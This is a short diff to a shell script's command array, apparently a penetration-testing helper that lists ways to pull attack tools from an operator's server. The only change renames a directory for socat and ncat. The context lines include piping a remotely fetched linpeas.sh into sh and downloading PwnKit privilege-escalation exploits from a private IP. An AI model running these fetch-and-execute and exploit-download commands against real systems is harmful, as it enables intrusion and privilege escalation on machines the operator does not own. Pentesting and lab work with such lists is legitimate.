@@ -32,8 +32,8 @@ commands=(
   "curl -O http://$address/linpeas.sh"
   "curl http://$address/linpeas.sh | sh"
   "wget ${address}/pwnKit"
-  "wget ${address}/static-binaries/x64/socat"
-  "wget ${address}/static-binaries/x64/ncat"
+  "wget ${address}/staticBins/x64/socat"
+  "wget ${address}/staticBins/x64/ncat"
   "wget -rnpH 192.168.45.207/pwnkit4034"
 )
 
